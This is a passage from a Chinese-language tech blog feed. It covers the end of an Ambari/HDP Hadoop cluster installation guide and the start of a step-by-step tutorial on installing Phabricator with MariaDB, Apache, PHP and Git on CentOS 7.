&lt;p&gt;HDP将存储信息的目录的选择是至关重要的。Ambari将尝试根据您环境中可用的安装点选择合理的默认值，但强烈建议您查看Ambari推荐的默认目录设置。特别是，确认目录，例如&lt;code&gt;/tmp和 /var&lt;/code&gt;被不被用于下&lt;code&gt;HDFS的NameNode&lt;/code&gt;目录和数据管理部目录HDFS标签。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;您必须为Hive和Oozie服务以及Knox的主密钥提供数据库密码。使用Hive作为示例，选择Hive选项卡并展开高级部分。在以红色标记的数据库密码字段中，提供密码，然后重新键入以确认。&lt;/p&gt;
&lt;p&gt;安装各个服务，并且完成安装后会启动相关服务，安装过程比较长，如中中出现错误，根据具体提供或日志进行操作。 &lt;/p&gt;
&lt;p&gt;这里我就不贴出来了，因为测试环境机器我做测试用机器配置不够所有后面结果经验写出来了。&lt;/p&gt;
&lt;p&gt;安装的还是提示失败：&lt;code&gt;ImportError: No module named rpm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;参考这篇文章重新安装解决了这个问题：&lt;a href=&quot;http://stackoverflow.com/questions/17490921/no-module-named-rpm-when-i-call-yum-on-shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ImportError: No module named rpm&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;11-安装，启动和测试&quot;&gt;&lt;a href=&quot;#11-安装，启动和测试&quot; class=&quot;headerlink&quot; title=&quot;11.安装，启动和测试&quot;&gt;&lt;/a&gt;11.安装，启动和测试&lt;/h3&gt;&lt;p&gt;安装的进度将显示在屏幕上。Ambari安装，启动，并对每个组件运行一个简单的测试。过程的总体状态显示在屏幕顶部的进度栏中，主机的主机状态显示在主要部分。在此过程中不要刷新浏览器。刷新浏览器可能会中断进度指示器。&lt;/p&gt;
&lt;p&gt;要查看每个主机已完成的任务的具体信息，请单击Message相应主机列中的链接。在 Tasks弹出窗口中，单击单个任务以查看相关的日志文件。您可以使用Show下拉列表选择过滤条件。要查看更大版本的日志内容，请单击Open图标或将内容复制到剪贴板，使用Copy图标。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装完成效果图:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari002.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;让我们从左侧栏或下拉菜单中选择Yarn进入YARN信息中心。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari004.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们将开始更新线程容量调度策略的配置。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari005.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;向下滚动到&lt;code&gt;Scheduler&lt;/code&gt;页面的部分。默认容量调度策略只有一个队列。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari006.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;让我们看看调度策略。向上滚动到页面顶部，然后点击快速链接。然后从下拉列表中选择&lt;code&gt;ResourceManager UI&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari007.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;正如你可以看到，我们只有默认策略。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://hortonassets.s3.amazonaws.com/ambari1_7/ambari008.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;p&gt;安装Ambari官网地址&lt;a href=&quot;https://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-installation/content/download_the_ambari_repo_lnx6.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;install Ambari&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://cwiki.apache.org/confluence/display/AMBARI/Installation+Guide+for+Ambari+2.4.2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;编译安装Ambari 2.4.2安装指南&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群&quot;&gt;&lt;a href=&quot;#HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群&quot; class=&quot;headerlink&quot; title=&quot;HORTONW0RKS数据平台搭建Ambar
    
    </summary>
    
      <category term="大数据" scheme="http://blog.yangcvo.me/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
      <category term="Big data Hadoop" scheme="http://blog.yangcvo.me/tags/Big-data-Hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Centos7搭建配置phabricator开源的可视化代码审查工具</title>
    <link href="http://blog.yangcvo.me/2017/01/07/%E8%87%AA%E5%8A%A8%E5%8C%96+%E5%8F%AF%E8%A7%86%E5%8C%96/Phabricator/Centos7%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AEphabricator%E5%BC%80%E6%BA%90%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5%E5%B7%A5%E5%85%B7/"/>
    <id>http://blog.yangcvo.me/2017/01/07/自动化+可视化/Phabricator/Centos7搭建配置phabricator开源的可视化代码审查工具/</id>
    <published>2017-01-07T05:47:27.000Z</published>
    <updated>2017-04-17T09:47:55.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。&quot;&gt;&lt;a href=&quot;#Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。&quot; class=&quot;headerlink&quot; title=&quot;Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。&quot;&gt;&lt;/a&gt;Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。&lt;/h2&gt;&lt;p&gt;公司项目管理和代码审查一直用&lt;code&gt;jira&lt;/code&gt;和&lt;code&gt;git&lt;/code&gt;来做,最近发现一个不错的开源的项目管理平台 自己搭建下感觉还挺好用的话就转移过来了。&lt;/p&gt;
&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;在Phabricator中，可以非常方便的针对每一段代码进行交际讨论;负责审查的工程师可以接受代码改变，可以提出疑问要求原作者继续修改等等。&lt;/p&gt;
&lt;p&gt;在Pharbricator中，可以新建代码仓库（也就是在phabricator中宿主仓库），也可以导入外部仓库（从外部仓库拉取数据，并跟踪该外部仓库保持数据同步，phabricator内部有一个更新机制）;支持http ，也支持ssh（不过配置比较麻烦点）; Phabricator支持两种代码审查工作流：“提交前审查”和“audit”（提交后审查）。&lt;/p&gt;
&lt;h3 id=&quot;在Phabricator的主面板中主要有以下几个工具：&quot;&gt;&lt;a href=&quot;#在Phabricator的主面板中主要有以下几个工具：&quot; class=&quot;headerlink&quot; title=&quot;在Phabricator的主面板中主要有以下几个工具：&quot;&gt;&lt;/a&gt;在Phabricator的主面板中主要有以下几个工具：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;差分 - 审查代码：管理预推代码审查工作流程;&lt;/li&gt;
&lt;li&gt;Maniphest - 任务和错误：管理成员的所有任务和Bug，可对任务或Bug展开讨论;&lt;/li&gt;
&lt;li&gt;Diffusion - 主机和浏览存储库：管理代码仓库，支持Git / Hg / SVN;&lt;/li&gt;
&lt;li&gt;审计 - 浏览和审计提交：管理后推代码审查工作流程;&lt;/li&gt;
&lt;li&gt;Phriction - Wiki：文档管理;&lt;/li&gt;
&lt;li&gt;项目 - 组织：工程管理，可关联资源库;&lt;/li&gt;
&lt;li&gt;源代码托管在&lt;a href=&quot;https://github.com/phacility/phabricator&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;特性：&quot;&gt;&lt;a href=&quot;#特性：&quot; class=&quot;headerlink&quot; title=&quot;特性：&quot;&gt;&lt;/a&gt;特性：&lt;/h3&gt;&lt;p&gt;代码审查（Code Review）&lt;br&gt;git仓库&lt;br&gt;跟踪bug&lt;br&gt;项目管理&lt;br&gt;团队沟通&lt;/p&gt;
&lt;p&gt;关于phabricator更多的介绍，访问项目官网：&lt;a href=&quot;https：//secure.phabricator.com/book/phabricator/article/introduction/&quot;&gt;phabricator&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;环境要求：&quot;&gt;&lt;a href=&quot;#环境要求：&quot; class=&quot;headerlink&quot; title=&quot;环境要求：&quot;&gt;&lt;/a&gt;环境要求：&lt;/h3&gt;&lt;p&gt;Phabricator是一个LAMP应用套件，因此最基本的要求就是LAMP环境：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;* Linux系统环境：centos7.1 64位&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Apache（或nginx，或lighttpd）：需要Apache 2.2.7以上版本。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* MySQL：MySQL必需&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* PHP：需要PHP5.2以上版本&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这里我安装版本：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Apache 2.2.15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* mysql 5.6.29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* php 5.4.16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;phabricator安装&quot;&gt;&lt;a href=&quot;#phabricator安装&quot; class=&quot;headerlink&quot; title=&quot;phabricator安装&quot;&gt;&lt;/a&gt;phabricator安装&lt;/h3&gt;&lt;p&gt;参考：&lt;a href=&quot;https : //secure.phabricator.com/book/phabricator/article/installation_guide/&quot;&gt;官网phabricator安装&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;具体过程不描述，以我参考的网络资源进行说明。网上的资源参考了特别多，只放我认为最有帮助的。&lt;/p&gt;
&lt;p&gt;首先，&lt;code&gt;phabricator&lt;/code&gt;是基于php的，同时需要发送邮件（提醒代码审查者），所以假定服务器上已经配置好了&lt;code&gt;php，mysql，nginx，postfix&lt;/code&gt;等环境;同时，官方推荐开启APC性能.&lt;/p&gt;
&lt;p&gt;###1 安装MariaDB数据库&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install mariadb mariadb-server&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;启动Mariadb服务：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systemctl start mariadb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;built_in&quot;&gt;enable&lt;/span&gt; mariadb&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行MySQL初始化安装脚本：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mysql_secure_installation&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;默认密码为空。&lt;/p&gt;
&lt;p&gt;这里需要配置优化my.cnf 如果默认不优化也是可以的不过安装完成以后可以看到我下面文章会出现10多个问题 大部分都是跟MySQL相关的。&lt;/p&gt;
&lt;h5 id=&quot;配置优化MariaDB数据库：&quot;&gt;&lt;a href=&quot;#配置优化MariaDB数据库：&quot; class=&quot;headerlink&quot; title=&quot;配置优化MariaDB数据库：&quot;&gt;&lt;/a&gt;配置优化MariaDB数据库：&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim /etc/my.cnf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[mysqld]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;innodb_buffer_pool_size = 1600M&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;max_allowed_packet = &lt;span class=&quot;string&quot;&gt;&quot;33554432&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sql_mode=STRICT_ALL_TABLES&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ft_stopword_file=/var/www/html/phabricator/resources/sql/stopwords.txt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ft_min_word_len = 3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&quot;需要执行的SQL语句：&quot;&gt;&lt;a href=&quot;#需要执行的SQL语句：&quot; class=&quot;headerlink&quot; title=&quot;需要执行的SQL语句：&quot;&gt;&lt;/a&gt;需要执行的SQL语句：&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator sql]&lt;span class=&quot;comment&quot;&gt;# mysql -uroot -pqwde1dsdfg3.com&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Welcome to the MariaDB monitor.  Commands end with ; or \g.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Your MariaDB connection id is 75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server version: 5.5.52-MariaDB MariaDB Server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Type &lt;span class=&quot;string&quot;&gt;&#39;help;&#39;&lt;/span&gt; or &lt;span class=&quot;string&quot;&gt;&#39;\h&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; help. Type &lt;span class=&quot;string&quot;&gt;&#39;\c&#39;&lt;/span&gt; to clear the current input statement.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MariaDB [(none)]&amp;gt; REPAIR TABLE phabricator_search.search_documentfield;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+-----------------------------------------+--------+----------+----------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| Table                                   | Op     | Msg_type | Msg_text |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+-----------------------------------------+--------+----------+----------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_search.search_documentfield | repair | status   | OK       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+-----------------------------------------+--------+----------+----------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1 row &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; (0.00 sec)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;mysql 5.6安装，不过这里我最后启用的是5.6版本，原因已经说明了.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2-安装Apache&quot;&gt;&lt;a href=&quot;#2-安装Apache&quot; class=&quot;headerlink&quot; title=&quot;2 安装Apache&quot;&gt;&lt;/a&gt;2 安装Apache&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;＃yum -y install httpd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置Apache，提高一点安全性：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&#39;s/^/#&amp;amp;/g&#39;&lt;/span&gt; /etc/httpd/conf.d/welcome.conf  &lt;span class=&quot;comment&quot;&gt;# 注释掉每一行&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&quot;s/Options Indexes FollowSymLinks/Options FollowSymLinks/&quot;&lt;/span&gt; /etc/httpd/conf/httpd.conf&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;启动Apache web服务：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systemctl start httpd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;built_in&quot;&gt;enable&lt;/span&gt; httpd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-安装PHP和一些模块&quot;&gt;&lt;a href=&quot;#3-安装PHP和一些模块&quot; class=&quot;headerlink&quot; title=&quot;3 安装PHP和一些模块&quot;&gt;&lt;/a&gt;3 安装PHP和一些模块&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install php php-mysqli php-mbstring php-gd php-curl php-cli php-common php-process&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置优化 不然安装成功以后会出现问题错误提现❌：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1. 未配置服务器时区  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator sql]&lt;span class=&quot;comment&quot;&gt;# vim /etc/php.ini&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;例 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;date.timezone = &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;改成: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;date.timezone = Asia/Shanghai &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PHP post_max_size未配置 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;将PHP 配置中的post_max_size 调整为至少32MB。设置为较小值时，大文件上传可能无法正常工作。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;post_max_size = 32M&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;php5.4版本可以直接使用&lt;a href=&quot;https://secure.phabricator.com/diffusion/P/browse/master/scripts/install/install_rhel-derivs.sh&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;phabricator.sh&lt;/a&gt;提供的脚本安装，这个脚本会检查&lt;code&gt;phabricator&lt;/code&gt;需要的环境，没有的会自动安装，之后会安装好phabricator，安装参考&lt;a href=&quot;https://my.oschina.net/yoyoko/blog/126325&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;phabricator&lt;/a&gt;安装向导.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;4-安装Git&quot;&gt;&lt;a href=&quot;#4-安装Git&quot; class=&quot;headerlink&quot; title=&quot;4 安装Git&quot;&gt;&lt;/a&gt;4 安装Git&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install git&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可参考网上防火墙和selinux建议根据此文章配置一下.&lt;/p&gt;
&lt;p&gt;如果你已经设置好LAMP环境，你可以已经获得你所需的任何东东。如何安装LAMP可以查看我写&lt;a href=&quot;http://blog.yangcvo.me/2014/12/07/Linux%E7%AC%94%E8%AE%B0/LAMP/yum%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BDLAMP%E7%8E%AF%E5%A2%83/&quot;&gt;yum一键安装与卸载LAMP环境&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;5-下载安装Phabricator&quot;&gt;&lt;a href=&quot;#5-下载安装Phabricator&quot; class=&quot;headerlink&quot; title=&quot;5 下载安装Phabricator&quot;&gt;&lt;/a&gt;5 下载安装Phabricator&lt;/h3&gt;&lt;p&gt;既然你已经安装以上所需的依赖环境服务，下面获取Phabricator以及其依赖包：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir /var/www/html/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /var/www/html/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/phacility/libphutil.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/phacility/arcanist.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/phacility/phabricator.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chown -R apache: /var/www/html/*&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;6-创建Apache虚拟主机配置文件&quot;&gt;&lt;a href=&quot;#6-创建Apache虚拟主机配置文件&quot; class=&quot;headerlink&quot; title=&quot;6 创建Apache虚拟主机配置文件&quot;&gt;&lt;/a&gt;6 创建Apache虚拟主机配置文件&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim /etc/httpd/conf.d/phabricator.conf&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;写入内容：&lt;/p&gt;
